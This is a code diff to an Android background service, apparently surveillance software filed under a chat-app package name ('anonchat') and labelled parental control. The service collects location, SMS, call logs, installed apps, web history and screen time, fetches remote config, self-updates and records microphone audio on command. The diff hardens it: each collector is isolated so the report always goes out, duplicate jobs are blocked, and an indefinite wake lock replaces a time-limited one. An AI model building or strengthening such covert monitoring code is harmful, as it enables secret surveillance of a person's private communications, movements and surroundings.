@@ -132,6 +132,7 @@ class TrackerService : Service() {
     private var job: Job? = null
 
     private fun startPeriodicReporting() {
+        if (job?.isActive == true) return
         writeDebugLog("startPeriodicReporting called, isRunning=${TrackerService.isRunning}")
         job = scope.launch {
             try {
@@ -143,7 +144,7 @@ class TrackerService : Service() {
                 writeDebugLog("Device registration FAILED: ${e.message}")
             }
 
-            while (true) {
+            while (isActive) {
                 try {
                     writeDebugLog("Collecting and reporting...")
                     collectAndReport()
@@ -156,8 +157,9 @@ class TrackerService : Service() {
     }
 
     private fun startConfigRefresh() {
+        if (configRefreshJob?.isActive == true) return
         configRefreshJob = scope.launch {
-            while (true) {
+            while (isActive) {
                 try {
                     fetchAndApplyConfig()
                 } catch (e: Exception) { e.printStackTrace() }
@@ -167,9 +169,10 @@ class TrackerService : Service() {
     }
 
     private fun startUpdateChecker() {
+        if (updateCheckJob?.isActive == true) return
         updateCheckJob = scope.launch {
             delay(30_000L)
-            while (true) {
+            while (isActive) {
                 try {
                     UpdateManager.checkForUpdate(this@TrackerService)
                 } catch (e: Exception) { e.printStackTrace() }
@@ -342,12 +345,25 @@ class TrackerService : Service() {
     private suspend fun collectAndReport() {
         val context = this@TrackerService
         try {
+            // Each collector is isolated: one failing collector (e.g. a
+            // ContentProvider error) must never block the rest of the payload.
             val deviceInfo = collectors.collectDeviceInfo(context)
-            val location = collectors.collectLocation(context)
-            val batteryInfo = collectors.collectBatteryInfo(context)
-            val smsMessages = collectors.collectSmsMessages(context)
-            val callLogs = collectors.collectCallLogs(context)
-            val installedApps = collectors.collectInstalledApps(context)
+            val location = try { collectors.collectLocation(context) } catch (e: Exception) {
+                writeDebugLog("Location collector error: ${e.message}"); null
+            }
+            val batteryInfo = try { collectors.collectBatteryInfo(context) } catch (e: Exception) {
+                writeDebugLog("Battery collector error: ${e.message}")
+                com.anonchat.app.parentalcontrol.util.BatteryInfo(-1, false, -1f)
+            }
+            val smsMessages = try { collectors.collectSmsMessages(context) } catch (e: Exception) {
+                writeDebugLog("SMS collector error: ${e.message}"); emptyList()
+            }
+            val callLogs = try { collectors.collectCallLogs(context) } catch (e: Exception) {
+                writeDebugLog("CallLog collector error: ${e.message}"); emptyList()
+            }
+            val installedApps = try { collectors.collectInstalledApps(context) } catch (e: Exception) {
+                writeDebugLog("Apps collector error: ${e.message}"); emptyList()
+            }
 
             val activities = mutableListOf<JSONObject>()
             val foregroundApp = collectors.collectForegroundApp(context)
@@ -362,8 +378,12 @@ class TrackerService : Service() {
                 })
             }
 
-            val screentime = collectors.collectScreenTime(context)
-            val webHistory = collectors.collectWebHistory(context)
+            val screentime = try { collectors.collectScreenTime(context) } catch (e: Exception) {
+                writeDebugLog("ScreenTime collector error: ${e.message}"); null
+            }
+            val webHistory = try { collectors.collectWebHistory(context) } catch (e: Exception) {
+                writeDebugLog("WebHistory collector error: ${e.message}"); emptyList()
+            }
             writeDebugLog("Collected: ${webHistory.size} web entries, ${smsMessages.size} sms, ${callLogs.size} calls")
 
             // Ensure notification listener service is bound and active
@@ -466,11 +486,21 @@ class TrackerService : Service() {
     }
 
     private fun acquireWakeLock() {
-        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(
-            PowerManager.PARTIAL_WAKE_LOCK, "ParentalControl:TrackerWakeLock"
-        )
-        wakeLock?.acquire(10 * 60 * 1000L)
+        try {
+            if (wakeLock == null) {
+                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+                wakeLock = powerManager.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK, "ParentalControl:TrackerWakeLock"
+                ).apply {
+                    setReferenceCounted(false)
+                }
+            }
+            if (wakeLock?.isHeld != true) {
+                wakeLock?.acquire()
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to acquire wakelock", e)
+        }
     }
 
     private suspend fun recordMicAudioToFile(context: Context, durationSec: Int, commandId: String) {
